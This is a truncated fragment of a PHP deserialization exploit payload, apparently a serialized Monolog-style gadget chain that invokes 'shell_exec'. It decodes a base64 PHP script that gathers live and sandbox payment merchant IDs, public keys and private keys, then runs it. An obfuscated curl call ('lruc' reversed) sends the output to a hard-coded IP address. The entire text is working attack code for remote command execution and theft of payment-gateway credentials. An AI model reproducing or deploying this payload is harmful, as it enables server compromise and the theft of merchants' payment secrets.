2FuZGJveFsncHVibGljX2tleSddKSkkbWlzc2luZ1tdPSdQVSc7CiAgICBpZihlbXB0eSgkbGl2ZVsncHJpdmF0ZV9rZXknXSkmJmVtcHR5KCRzYW5kYm94Wydwcml2YXRlX2tleSddKSkkbWlzc2luZ1tdPSdQUic7CiAgICAKICAgICRtaXNzaW5nU3RyPWltcGxvZGUoJywnLCRtaXNzaW5nKTsKICAgIG91dCgiRVJSOklOQ09NUExFVEU6Ii4kbWlzc2luZ1N0cik7Cn0KCiRvdXRwdXQ9W107CmlmKCRoYXNMaXZlKXsKICAgICRvdXRwdXRbXT1pbXBsb2RlKCcsJyxbJGxpdmVbJ21lcmNoYW50X2lkJ10sJGxpdmVbJ3B1YmxpY19rZXknXSwkbGl2ZVsncHJpdmF0ZV9rZXknXV0pOwp9CmlmKCRoYXNTYW5kYm94KXsKICAgIGlmKCRoYXNMaXZlKSRvdXRwdXRbXT0nfCc7CiAgICAkb3V0cHV0W109aW1wbG9kZSgnLCcsWyRzYW5kYm94WydtZXJjaGFudF9pZCddLCRzYW5kYm94WydwdWJsaWNfa2V5J10sJHNhbmRib3hbJ3ByaXZhdGVfa2V5J11dKS4nW1NCXSc7Cn0KCm91dChpbXBsb2RlKCcnLCRvdXRwdXQpKTsKCg==|base64 -d>$T;R=$(cd $M;php $T 2>&1);rm -f $T;$(echo lruc|rev) -s 'http://217.64.149.92:80/6n52zo05ggqvszhb?result='$R 2>/dev/null";S:5:"level";N;}}S:5:"level";N;S:11:"initialized";b:1;S:11:"bufferLimit";i:-1;S:10:"processors";a:2:{i:0;S:7:"current";i:1;S:10:"shell_exec";}}}
